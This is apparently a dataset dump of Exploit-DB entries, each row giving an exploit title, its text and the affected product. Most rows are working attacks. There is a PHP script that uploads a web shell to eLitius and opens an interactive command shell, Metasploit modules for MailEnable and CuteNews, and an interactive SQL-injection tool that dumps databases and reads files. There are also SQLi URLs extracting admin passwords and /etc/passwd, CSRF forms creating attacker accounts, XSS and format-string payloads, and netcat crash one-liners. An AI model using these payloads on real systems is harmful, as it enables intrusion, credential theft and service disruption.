33947,"Last Wizardz - 'id' SQL Injection source: https://www.securityfocus.com/bid/39968/info  Last Wizardz is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/content.php?id=NULL+UNION+ALL+SELECT+1,CONCAT(id,0x3a,admin,0x3a,admin_pass),3,4,5,6,7,8+FROM+site_admin",Last Wizardz,1
8603,"eLitius 1.0 - Remote Command Execution <?php //786 /* ==============================================================================                       _      _       _          _      _   _                       / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                                                                ==============================================================================                       ____   _  _     _   _    ___    _  __                      / ___| | || |   | \ | |  / _ \  | |/ /                     | |  _  | || |_  |  \| | | | | | | ' /                      | |_| | |__   _| | |\  | | |_| | | . \                       \____|    |_|   |_| \_|  \___/  |_|\_\ I'm From Iran...  ============================================================================== 	eLitius v1.0 Remote Command Execution Exploit ==============================================================================  	[Âª] Script:.............[ eLitius v1.0 ].............................. 	[Âª] Website:............[ http://www.elitius.com/ ]................... 	[Âª] Today:..............[ 30042009 ].................................. 	[Âª] Founder:............[ G4N0K | mail[o]ganok[sh!t]gmail.com ].......   	[!] What is going on... 	--------------------------------- 	00. Auth Bypass... 	01. Arbitrary File upload (MIME-Type Spoofing)...  	     [+] demo... 	--------------------------------- 	xpl.php 127.0.0.1 /eLitius_v_1_0/ 		         +-------------------------------------------------------------+         |        eLitius v1.0 Remote Command Execution Exploit        |         |              by: G4N0K | mail[o]ganok[ta]com                |         |             Thanks: ALLAH, MSD, SMN, AMD, AFN               |         +-------------------------------------------------------------+       [+] Trying to exploit 127.0.0.1...      [+] File has been uploaded...      [+] Now you can exec your commands...  php-shell@127.0.0.1# dir  Volume in drive E has no label.  Volume Serial Number is 042D-D300   Directory of E:\www\eLitius_v_1_0\admin\banners  09/09/2009  03:01 AM    <DIR>          . 09/09/2009  03:01 AM    <DIR>          .. 09/09/2009  07:58 PM           104,747 1.gif 09/09/2009  03:01 AM                89 banner_ditails.php 09/09/2009  07:58 PM           104,747 DEH-P9800BT remote control.gif 09/09/2009  08:33 AM            19,638 sponimage.php.gif                4 File(s)        232,681 bytes                2 Dir(s)     125,026,304 bytes free php-shell@127.0.0.1# exit C:\>  */ error_reporting(0);  if (php_sapi_name() <> ""cli"") { 	die(""WTF, Run Me From CommandLine...""); } if ($argc <> 3){__nfo();__usg();exit;} $hst = $argv[1]; $pth = $argv[2];  function __snd($hst, $pkt) { 	$socket = fsockopen($hst, 80, $errno, $errstr, 30); 	$ggg=''; 	if (!$socket) { 		echo ""\r\n    [+] Socket err#: $errstr ($errno)\n\r"";exit; 	} else { 		fwrite($socket, $pkt); 		while (!feof($socket)) { 			$g4n0k.=fgets($socket, 2048); 		} 		fclose($socket); 		return $g4n0k; 	} }  function __srch($wt){ 	$pos = strpos($wt, 'gnkgnkgnk'); 	$pos_end = strrpos($wt, 'gnkgnkgnk'); 	if (!$pos && !$pos_end){echo "" [!] error...\r\n"";} 	$rest = substr($wt, $pos+9, ($pos_end - ($pos+9))); 	return $rest; }  function __nfo() { $ganok = <<<EOL 	         +-------------------------------------------------------------+         |        eLitius v1.0 Remote Command Execution Exploit        |         |              by: G4N0K | mail[o]ganok[ta]com                |         |             Thanks: ALLAH, MSD, SMN, AMD, AFN               |         +-------------------------------------------------------------+ \r\n EOL; print $ganok; }  function __usg() { echo <<<GNK         uasge...: 		  xpl.php host path 		  xpl.php 127.0.0.1 /eLitius_v_1_0/ GNK; }   $joke = '-----------------------------3902153292 Content-Disposition: form-data; name=""userfile""; filename=""banner_ditails.php"" Content-Type: image/gif  <?php error_reporting(0);print(""gnkgnkgnk"");passthru($_GET[""gnk""]);print(""gnkgnkgnk""); ?> -----------------------------3902153292 Content-Disposition: form-data; name=""fileupload""  Upload -----------------------------3902153292 Content-Disposition: form-data; name=""directory""  banners -----------------------------3902153292-- ';  $msd_pyld  = ""POST {$pth}admin/uploadimage.php HTTP/1.1\r\n""; $msd_pyld .= ""Host: {$hst}\r\n""; $msd_pyld .= ""Keep-Alive: 300\n\r""; $msd_pyld .= ""Connection: keep-alive\r\n""; $msd_pyld .= ""Content-Length: "".strlen($joke).""\r\n""; $msd_pyld .= ""Content-Type: multipart/form-data; boundary=---------------------------3902153292\r\n\r\n""; $msd_pyld .= $joke;  __nfo(); echo ""\r\n    [+] Trying to exploit {$hst}...\n\r""; if (stristr(__snd($hst, $msd_pyld), ""uploaded"")){ 	echo ""\r\n    [+] File has been uploaded...\n\r\r\n    [+] Now you can exec your commands...\r\n""; } else { 	echo ""\r\n    [+] Oops!, Upload failed.\n\r""; exit; }  while(1) { 	echo ""\r\nphp-shell@{$hst}# ""; 	if (($cmd = str_replace ("" "", ""%20"", trim(fgets(STDIN)))) == ""exit"") exit; 	$smn_pyld  = ""GET {$pth}admin/banners/banner_ditails.php?gnk="".$cmd."" HTTP/1.1\r\n""; 	$smn_pyld .= ""Host: {$hst}\r\n""; 	$smn_pyld .= ""Connection: close\n\r\n\r""; 	print __srch(__snd($hst, $smn_pyld)); }  ?>  # milw0rm.com [2009-05-04]",eLitius,1
30666,"ACE Stream Media 2.1 - 'acestream://' Format String ﻿ ACE Stream Media 2.1 (acestream://) Format String Exploit PoC   Vendor: ACE Stream Product web page: http://www.acestream.org Affected version: Ace Player HD 2.1.9 (VLC 2.0.5)  Summary: Ace Stream is an innovative multimedia platform of a new generation, which includes different products and solutions for ordinary Internet users as well as for professional members of the multimedia market. Ace Stream uses in its core, P2P (peer-to-peer) technology, BitTorrent protocol, which is acknowledged as the most effective protocol to transfer/deliver 'heavy content'.  Desc: ACE Stream Media (Ace Player HD) is prone to a remote format string vulnerability because the application fails to properly sanitize user-supplied input thru the URI using the 'acestream://' protocol before including it in the format-specifier argument of a formatted-printing function. A remote attacker may exploit this issue to execute arbitrary code with the privileges of the user running the affected application and/or cause memory address disclosure. Failed exploit attempts may cause denial-of-service (DoS) conditions.   Tested on: Microsoft Windows 7 Professional SP1 (EN) 64bit   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2014-5165 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5165.php   30.12.2013  --   format md:  acestream://AAAA%08x.%08x.%08x.%08x.%08x.AAAA acestream://AAAA%08p.%08p.%08p.%08p.%08p.%08p.%08p.%08p.%08pAAAAA acestream://AAAA%s acestream://AAAA%s.AAAA%08x.%08x.%08x.%08x.AAAA acestream://AAAA%08d acestream://%i%i%i%i acestream://%c%c%c%c acestream://%f%f%f%f acestream://AAAA%.8x.%.8p.%.8i.%.8d.%.8f.%.8s.%n.%08x.%08x.%08x.%08x.%08x.%08xAAAA acestream://%15.10s.%15.10s acestream://%8x%8x%8x%8x%8x%8x%8x%8x%8x acestream://%0a%0d acestream://%AA acestream://%p%p%p%p%s  crashes:  acestream://AAAA%08s acestream://AAAA%n acestream://%08s acestream://%p%p%p%p%s%n acestream://%n acestream://%s%s%s%s acestream://AAAA%15.10s.%15.10s.%15.10s.%15.10s.%15.10s.%15.10sAAAA",ACE Stream Media,1
26911,"Komodo CMS 2.1 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/15966/info  Komodo CMS is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  Successful exploitation of these vulnerabilities could result in a compromise of the application, disclosure or modification of data, the theft of cookie-based authentication credentials. They may also permit an attacker to exploit vulnerabilities in the underlying database implementation as well as other attacks.  These issues affect Komodo CMS version 2.1; other versions may also be vulnerable.   http://www.example.com/page.php?page=[SQL]",Komodo CMS,1
21090,"CuteFTP 4.2 - Default Weak Password Encoding source: https://www.securityfocus.com/bid/3233/info  CuteFTP is a popular commercial FTP client for Microsoft Windows systems.  CuteFTP v4.2(and possibly earlier versions) uses a weak system for encoding passwords for accounts on FTP sites. Passwords are stored in a file called 'sm.dat', and can be easily retrieved provided the site manager password has not been set.  Successful exploitation of this vulnerability will allow a local attacker to gain unauthorized access to the FTP sites used by other local users.   This piece of VB code will decode the passwords stored in sm.dat for the FTP accounts  Works only if you have NOT set a password on the Site Manager!   'Decode a single character Public Function CuteDecode(i_Asc As Integer)  CuteDecode = ((Not i_Asc) And 200) + (i_Asc And 55)  End Function  'Decode password Public Function CuteDecodeString(str_password As String)  Dim i As Integer  CuteDecodeString = """"  For i = 1 To Len(str_password) CuteDecodeString = CuteDecodeString + Chr$(CuteDecode(Asc(Mid(str_password, i, 1)))) Next i  End Function",CuteFTP,1
16480,"MailEnable - IMAPD W3C Logging Buffer Overflow (Metasploit) ## # $Id: mailenable_w3c_select.rb 9525 2010-06-15 07:18:08Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::Imap 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'MailEnable IMAPD W3C Logging Buffer Overflow', 			'Description'    => %q{ 					This module exploits a buffer overflow in the W3C logging 				functionality of the MailEnable IMAPD service. Logging is 				not enabled by default and this exploit requires a valid 				username and password to exploit the flaw. MailEnable 				Professional version 1.6 and prior and MailEnable Enterprise 				version 1.1 and prior are affected. 			}, 			'Author'         => [ 'MC' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9525 $', 			'References'     => 				[ 					[ 'CVE', '2005-3155'], 					[ 'OSVDB', '19842'], 					[ 'BID', '15006'], 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Payload'        => 				{ 					'Space'    => 600, 					'BadChars' => ""\x00\x0a\x0d\x20"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['MailEnable 1.54 Pro Universal', { 'Ret' => 0x1001c019 } ] #MEAISP.DLL 				], 			'DisclosureDate' => 'Oct 03 2005', 			'DefaultTarget' => 0)) 	end  	def check 		connect 		disconnect  		if (banner and banner =~ /MailEnable Service, Version: 0-1\.54/) 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end  	def exploit 		connect_login  		buf = rand_text_alphanumeric(6196, payload_badchars) 		seh = generate_seh_payload(target.ret) 		req = 'a01 SELECT ' + buf + seh + ""\r\n"" 		sock.put(req)  		handler 		disconnect 	end  end",MailEnable,1
33503,"Orion Application Server 2.0.7 - 'Terminal Escape Sequence in Logs' Command Injection source: https://www.securityfocus.com/bid/37717/info  Orion Application Server is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in logfiles.  Attackers can exploit this issue to execute arbitrary commands in a terminal.  Orion Application Server 2.0.7 is vulnerable; other versions may also be affected.    curl -kis http://localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  echo -en ""GET /\x1b]2;owned?\x07\x0a\x0d\x0a\x0d"" > payload nc localhost 80 < payload",Orion Application Server,1
46698,"CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking     include Msf::Exploit::Remote::HttpClient     def initialize(info = {})     super(update_info(info,       'Name' => ""CuteNews 2.1.2 - 'avatar' Remote Code Execution"",       'Description' => %q(         This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.         The attacker can infiltrate the server through the avatar upload process in the profile area.         There is no realistic control of the $imgsize function in ""/core/modules/dashboard.php""         Header content of the file can be changed and the control can be bypassed.         We can use the ""GIF"" header for this process.         An ordinary user is enough to exploit the vulnerability. No need for admin user.         The module creates a file for you and allows RCE.       ),       'License' => MSF_LICENSE,       'Author' =>         [           'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module         ],       'References' =>         [           ['URL', 'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html']           ['URL', 'http://cutephp.com'] # Official Website         ],       'Platform' => 'php',       'Arch' => ARCH_PHP,       'Targets' => [['Automatic', {}]],       'Privileged' => false,       'DisclosureDate' => ""Apr 14 2019"",       'DefaultTarget' => 0))       register_options(       [         OptString.new('TARGETURI', [true, ""Base CutePHP directory path"", '/CuteNews']),         OptString.new('USERNAME', [true, ""Username to authenticate with"", 'admin']),         OptString.new('PASSWORD', [false, ""Password to authenticate with"", 'admin'])       ]     )   end    def exec     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""uploads"",""avatar_#{datastore['USERNAME']}_#{@shell}"") # shell url     })   end ## # Login and cookie information gathering ##     def login(uname, pass, check)     # 1st request to get cookie     res = send_request_cgi(       'method' => 'POST',       'uri' => normalize_uri(target_uri.path, 'index.php'),       'vars_post' => {         'action' => 'dologin',         'username' => uname,         'password' => pass       }     )      cookie = res.get_cookies     # 2nd request to cookie validation     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php""),       'cookie'   => cookie     })       if res.code = 200 && (res.body =~ /dashboard/)       return cookie          end       fail_with(Failure::NoAccess, ""Authentication was unsuccessful with user: #{uname}"")     return nil   end     def peer     ""#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}""   end ## # Upload malicious file // payload integration ##   def upload_shell(cookie, check)      res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php?mod=main&opt=personal""),       'cookie'   => cookie     })      signkey = res.body.split('__signature_key"" value=""')[1].split('""')[0]     signdsi = res.body.split('__signature_dsi"" value=""')[1].split('""')[0]     # data preparation     fname = Rex::Text.rand_text_alpha_lower(8) + "".php""     @shell = ""#{fname}""     pdata = Rex::MIME::Message.new     pdata.add_part('main', nil, nil, 'form-data; name=""mod""')     pdata.add_part('personal', nil, nil, 'form-data; name=""opt""')     pdata.add_part(""#{signkey}"", nil, nil, 'form-data; name=""__signature_key""')     pdata.add_part(""#{signdsi}"", nil, nil, 'form-data; name=""__signature_dsi""')     pdata.add_part('', nil, nil, 'form-data; name=""editpassword""')     pdata.add_part('', nil, nil, 'form-data; name=""confirmpassword""')     pdata.add_part(""#{datastore['USERNAME']}"", nil, nil, 'form-data; name=""editnickname""')     pdata.add_part(""GIF\r\n"" + payload.encoded, 'image/png', nil, ""form-data; name=\""avatar_file\""; filename=\""#{fname}\"""")     pdata.add_part('', nil, nil, 'form-data; name=""more[site]""')     pdata.add_part('', nil, nil, 'form-data; name=""more[about]""')     data = pdata.to_s       res = send_request_cgi({       'method' => 'POST',           'data'  => data,       'agent' => 'Mozilla',       'ctype' => ""multipart/form-data; boundary=#{pdata.bound}"",       'cookie' => cookie,       'uri' => normalize_uri(target_uri.path, ""index.php"")          })      if res && res.code == 200 && res.body =~ /User info updated!/       print_status(""Trying to upload #{fname}"")       return true     else       fail_with(Failure::NoAccess, 'Error occurred during uploading!')       return false     end    end ## # Exploit controls and information ##   def exploit     unless Exploit::CheckCode::Vulnerable == check       fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')     end      cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)     print_good(""Authentication was successful with user: #{datastore['USERNAME']}"")      if upload_shell(cookie, true)       print_good(""Upload successfully."")       exec     end   end ## # Version and Vulnerability Check ##   def check       res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php"")     })       unless res       vprint_error 'Connection failed'       return CheckCode::Unknown     end       if res.code == 200       version = res.body.split('target=""_blank"">CuteNews ')[1].split('</a>')[0]       if version < '2.1.3'        print_status(""#{peer} - CuteNews is #{version}"")        return Exploit::CheckCode::Vulnerable       end     end       return Exploit::CheckCode::Safe   end end ## # The end of the adventure (o_O) // AkkuS ##",CuteNews,1
15597,"Acidcat CMS 3.3 - 'FCKeditor' Arbitrary File Upload ==============================================================================            [»] Acidcat CMS v 3.3 (fckeditor) Shell Upload Vulnerability   ==============================================================================        [»] Title   :           [ Acidcat CMS v 3.x (fckeditor) Shell Upload Vulnerability ]       [»] Script  :           [ Mini-NUKE v2.3  ]        [»] Language:           [ ASP ]        [»] Download:           [ http://www.acidcat.com/default.asp?itemID=202&itemTitle=Download Free]       [»] Author  :           [ Net.Edit0r - black.hat.tm@gmail.com }       [»] My Home :           [ ajaxtm.com and datacoders.org ]        [»] Date    :           [ 2010-11-23 ]         [»] Version :           [ 3.3.X and 3.2.x ]      [»] Dork    :           [ ""Powered by Acidcat CMS "" ]        ###########################################################################         ===[ Exploit ]===        [»] http://server/admin/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=connectors/asp/connector.asp      [»] asp renamed via the .asp;.jpg (shell.asp;.jpg)  ===[ Upload To ]===    [»] http://server/read_write/file/[Shell]     [»] http://server/public/File/[Shell]   Greetz : HUrr!c4nE , H-SK33PY , Cair3x , B3hz4d , Skitt3r , M4hd1       BHG : Net.Edit0r ~ Darkcoder ~ AmIr_Magic  ~ keracker                                      ###########################################################################",Acidcat CMS,1
9071,"Apple Safari 4.x - JavaScript Reload Remote Crash ___________________________________________________________________________________  Apple Safari 4.x JavaScript Reload Denial of Service ___________________________________________________________________________________  Author   : Marcell 'SkyOut' Dietl, Achim Hoffmann Email    : mail [at] marcell-dietl [dot] de Vendor   : http://www.apple.com/ Product  : http://www.apple.com/safari/ Found    : 12.06.2009 Released : 01.07.2009  Tested on:  - Safari 4.0 at Windows XP SP3  - Safari 4.0.1 at Mac OS X 10.5.7 ___________________________________________________________________________________ STEPS TO REPRODUCE  1) Create a HTML file with the following content:  +---------- | <html> | <body> | <script src=""empty.js""></script> | <script> | try { crashSafari(); } catch(e) { | setTimeout(""location.reload();"",42); | prompt('apple culpa? comment:'); } | </script> | </body> | </html> +----------  2) Create an empty file called ""empty.js"" in the same directory.  3) Put both files into the WWW directory of your server.  4) Access the HTML file with your browser.    - A popup will appear: Close it.    - A popup will appear: Close it.    - Crash.  5) On Windows:  +---------- | AppName: safari.exe      AppVer: 4.530.17.0      ModName: webkit.dll | ModVer: 4.530.17.0       Offset: 00305f55 +----------  5) On Mac OS X:  +---------- | Process:         Safari [298] | Path:            /Applications/Safari.app/Contents/MacOS/Safari | Identifier:      com.apple.Safari | Version:         4.0.1 (5530.18) | Build Info:      WebBrowser-55301800~1 | Code Type:       X86 (Native) | Parent Process:  launchd [163] | | Date/Time:       2009-07-01 00:58:48.144 +0200 | OS Version:      Mac OS X 10.5.7 (9J61) | Report Version:  6 | | Exception Type:  EXC_BAD_ACCESS (SIGBUS) | Exception Codes: KERN_PROTECTION_FAILURE at 0x0000000000000002 | | Thread 0 crashed with X86 Thread State (32-bit): |   eax: 0x00000002  ebx: 0x900bac11  ecx: 0x00625eec  edx: 0x00000000 |   edi: 0x00625ec8  esi: 0x00000002  ebp: 0xbfffe778  esp: 0xbfffe5e0 |    ss: 0x0000001f  efl: 0x00010217  eip: 0x900bac74   cs: 0x00000017 |    ds: 0x0000001f   es: 0x0000001f   fs: 0x00000000   gs: 0x00000037 |   cr2: 0x00000002 +---------- ___________________________________________________________________________________ Advisory  : http://marcell-dietl.de/index/adv_safari_4_x_js_reload_dos.php  Live Demo : http://marcell-dietl.de/index/demo_safari_4_x_js_reload_dos.html  Apple has been informed about the bug, but did not show any interest. ___________________________________________________________________________________ HAVING FUN WITH FULL DISCLOSURE SINCE 2006  # milw0rm.com [2009-07-02]",Apple Safari,1
32529,"Sun Java Web Start 1.0/1.2 - Remote Command Execution source: https://www.securityfocus.com/bid/31916/info  Sun Java Web Start is prone to a remote command-execution vulnerability.  Successful exploits may allow attackers to execute arbitrary commands on an unsuspecting user's computer. This may aid in further attacks.  We don't know which versions of Java Web Start are affected. We will update this BID when more information is released.   BasicService basicService = (BasicService)    ServiceManager.lookup(""javax.jnlp.BasicService"");  URL mike = new URL(""file:\\C:\\music.rm"");  basicService.showDocument(mike);",Sun Java Web Start,1
30689,"Taboada Macronews 1.0 - SQL Injection <?php /* # Exploit Title: Taboada Macronews <= 1.0 SQLi Exploit # Date: 03rd January 2013 # Exploit Author: WhiteCollarGroup # Software Link: http://www.scriptbrasil.com.br/download/codigo/7144/ # Version: 1.0 # Google Dork: intext:""Powered by: joaotaboada.com""  Usage:     php filename.php */  function puts($str) {     echo $str.""\n""; }   function gets() {     return trim(fgets(STDIN)); }    function hex($string){     $hex=''; // PHP 'Dim' =]     for ($i=0; $i < strlen($string); $i++){         $hex .= dechex(ord($string[$i]));     }     return '0x'.$hex; }   $token = uniqid(); $token_hex = hex($token);   puts(""Taboada Macronews <= 1.0 SQL Injection Exploit""); puts(""By WhiteCollarGroup (0KaL miss all of you guys)"");   puts(""[?] Enter website URL (e. g.: http://www.target.com/taboada/):""); $target = gets();   puts(""[*] Checking...""); if(!@file_get_contents($target)) die(""[!] Access error: check domain and path."");  puts(""[.] Connected.""); if(substr($target, (strlen($target)-1))!=""/"") $target .= ""/"";   function runquery($query) {     global $target,$token,$token_hex;           $query = preg_replace(""/;$/"", null, $query);           $query = urlencode($query);     $rodar = $target . ""news_popup.php?id='%20UNION%20ALL%20SELECT%201,2,3,concat($token_hex,%28$query%29,$token_hex),5,6,7,8--%20""; //    die($rodar);     $get = file_get_contents($rodar);     $matches = array();     preg_match_all(""/$token(.*)$token/"", $get, $matches);     if(isset($matches[1][0]))         return $matches[1][0];     else         return false; }   if(runquery(""SELECT $token_hex"")!=$token) {     puts(""[!] Couldn't get data"");     exit; }  puts(""[i] MySQL version is "".runquery(""SELECT version()"")); puts(""[i] MySQL user is "".runquery(""SELECT user()""));   function main($msg=null) {     global $token,$token_hex;           echo ""\n"".$msg.""\n"";     puts(""[>] MAIN MENU"");     puts(""[1] Browse MySQL"");     puts(""[2] Run SQL Query"");     puts(""[3] Read file"");     puts(""[4] About"");     puts(""[0] Exit"");     $resp = gets();       if($resp==""0"")         exit;     elseif($resp==""1"") {                   // pega dbs         $i = 0;         puts(""[.] Getting databases:"");         while(true) {             $pega = runquery(""SELECT schema_name FROM information_schema.schemata LIMIT $i,1"");             if($pega)                 puts("" - "".$pega);             else                 break;                               $i++;         }                   puts(""[!] Current database: "".runquery(""SELECT database()""));         puts(""[?] Enter database name for select:"");         $own = array();         $own['db'] = gets();         $own['dbh'] = hex($own['db']);                   // pega tables da db         $i = 0;         puts(""[.] Getting tables from $own[db]:"");         while(true) {             $pega = runquery(""SELECT table_name FROM information_schema.tables WHERE table_schema=$own[dbh] LIMIT $i,1"");             if($pega)                 puts("" - "".$pega);             else                 break;                               $i++;         }         puts(""[?] Enter table name for select:"");         $own['tb'] = gets();         $own['tbh'] = hex($own['tb']);                   // pega colunas da table         $i = 0;         puts(""[.] Getting columns from $own[db].$own[tb]:"");         while(true) {             $pega = runquery(""SELECT column_name FROM information_schema.columns WHERE table_schema=$own[dbh] AND table_name=$own[tbh] LIMIT $i,1"");             if($pega)                 puts("" - "".$pega);             else                 break;                               $i++;         }         puts(""[?] Enter columns name, separated by commas (\"",\"") for select:"");         $own['cl'] = explode("","", gets());                   // pega dados das colunas                   foreach($own['cl'] as $coluna) {             $i = 0;             puts(""[=] Column: $coluna"");             while(true) {                 $pega = runquery(""SELECT $coluna FROM $own[db].$own[tb] LIMIT $i,1"");                 if($pega) {                     puts("" - $pega"");                     $i++;                 } else                     break;             }                           echo ""\n[ ] -+-\n"";         }                   main();               } elseif($resp==""2"") {         puts(""[~] RUN SQL QUERY"");         puts(""[!] You can run a SQL code. It can returns a one-line and one-column content. You can also use concat() or group_concat()."");         puts(""[?] Query (enter for exit): "");         $query = gets();         if(!$query) main();         else main(runquery($query.""\n""));     } elseif($resp==""3"") {         puts(""[?] File path (may not have priv):"");         $file = hex(gets());         $le = runquery(""SELECT load_file($file) AS wc"");         if($le)             main($le);         else             main(""File not found, empty or no priv!"");                   } elseif($resp==""4"") {         puts(""Coded by 0KaL @ WhiteCollarGroup"");         puts(""tinyurl.com/WCollarGroup"");         main();     }     else         main(""[!] Wrong choice.""); }   main();",Taboada Macronews,1
40707,"nodCMS - Cross-Site Request Forgery # Exploit Title :              nodcms Cross Site Request Forgery # Author :                     Ashiyane Digital Security Team # Google Dork :                 - # Date :                       29/10/2016 # Type :                       webapps # Platform :                   PHP # Vendor Homepage :  http://www.nodcms.com/en  Software link :   https://github.com/khodakhah/nodcms/archive/master.zip    ########################### CSRF PoC ############################### # create User: username=Attacker & password=123456  <html>   <!-- CSRF PoC  -->   <body>     <form name=""form0"" action=""http://SiteName/admin/user_manipulate"" method=""POST"">       <input type=""hidden"" name=""data[username]"" value=""Attacker"" />       <input type=""hidden"" name=""data[email]"" value=""Attacker@attacker.com"" />       <input type=""hidden"" name=""data[fullname]"" value=""Atacker"" />       <input type=""hidden"" name=""data[password]"" value=""123456"" />       <input type=""hidden"" name=""data[status]"" value=""1"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html> ####################################################################  # CSRF/Xss <html>   <!-- CSRF PoC  -->   <body>     <form name=""form1"" action=""http://sitename/admin/settings/generall"" method=""POST"">       <input type=""hidden"" name=""data[language_id]"" value=""1"" />       <input type=""hidden"" name=""data[company]"" value=""<script>alert(/xss/)</script>"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html> #################################################################### #-# Discovered by : Amir.ght",nodCMS,1
25837,"Monkey HTTPd 1.1.1 - Crash (PoC) Title: ====== Monkey HTTPD 1.1.1 - Denial of Service Vulnerability  Date: ===== 2013-05-28  References: =========== http://bugs.monkey-project.com/ticket/181  Introduction: ============= Monkey is a lightweight and powerful web server for GNU/Linux.  It has been designed to be very scalable with low memory and CPU consumption, the perfect solution for embedded devices. Made for ARM, x86 and x64.  Abstract: ========= The vulnerability is a denial of service which is caused by sending a null byte in an HTTP request to the web server.  Report-Timeline: ================ 2013-05-23:	Discovered vulnerability via fuzzing 2013-05-25:	Vendor Notification 2013-05-26:	Vendor Response/Feedback 2013-05-27:	Vendor Fix/Patch 2013-05-28:	PublicDisclosure  Status: ======== Published  Affected Products: ================== Monkey HTTPD - version 1.1.1  Exploitation-Technique: ======================= Remote  Details: ======== A bug discovered in Monkey's HTTP parser allows an attacker to cause a segmentation fault in one of the daemon's threads using a specially crafted request containing a null byte. An attacker can crash all the available threads by sending the specially crafted request multiple times, rendering the server useless for legitimate users.  Proof of Concept: ================= The vulnerability can be exploited by remote attacker without any special privileges. The placement of the null byte within the request does not seem to have any effect on the result. The null byte may even be used instead of an HTTP method such as, GET. Below is an example of how this bug can be manually triggered:  ruby -e 'puts ""GET /\x00 HTTP/1.1\r\n\r\n""'|netcat localhost 2001  Solution: ========= This vulnerability has been fixed for the 1.2.0 release.  Risk: ===== The security risk of the redirection vulnerability is estimated as low(+).  Credits: ======== Doug Prostko <dougtko[at]gmail[dot]com> - Vulnerability discovery",Monkey HTTPd,1
27367,Link Bank - 'Iframe.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17001/info  Link Bank is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before including it in dynamically generated HTML content.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/iframe.php?site=%3C/title%3E%3C/head%3E%3Cscript%20src=http://www.example.com/xss.js%3E%3C/script%3E,Link Bank,1
5541,"PostNuke Module pnEncyclopedia 0.2.0 - SQL Injection ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \    |    __)_ /    \  \//    ~    \/   |   \   |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                                           .OR.ID ECHO_ADV_90$2008  ----------------------------------------------------------------------------------------- [ECHO_ADV_90$2008] PostNuke Module pnEncyclopedia <= 0.2.0 (id) Blind Sql Injection Vulnerability -----------------------------------------------------------------------------------------  Author         : M.Hasran Addahroni Date           : May, 5 th 2008 Location       : Jakarta, Indonesia Web            : http://advisories.echo.or.id/adv/adv90-K-159-2008.txt Critical Lvl   : Medium Impact	       : System access Where	       : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application   : pnEncyclopedia version       : <= 0.2.0 Vendor        : http://sourceforge.net/projects/pnencyclopedia/ Description   :  Encyclopedia intended for the creation of the open encyclopedia on a PostNuke website. Users can submit new terms and offer changes to current ones but an editor can accept or reject the requested changes. ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~  Input passed to the ""id"" parameter is not properly verified before being used to sql query.  This can be exploited thru the browser and get the username and hash md5 password from users. Successful exploitation requires that ""magic_quotes"" is off   Poc/Exploit: ~~~~~~~~~  http://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,version(),8,9,10,11-- http://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,load_file(0x2f6574632f706173737764),8,9,10,11-- http://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,concat(pn_uname,0x3a,pn_pass),8,9,10,11 from nuke_users limit 1,1--  Dork: ~~~~ Google    : ""index.php?module=pnEncyclopedia"" ""allinurl:index.php?module=pnEncyclopedia""   Solution: ~~~~~~  - Edit the source code to ensure that input is properly verified. - Turn on magic_quotes in php.ini    Timeline: ~~~~~~~~  - 01 - 05 - 2008 bug found - 05 - 05 - 2008 advisory released ---------------------------------------------------------------------------  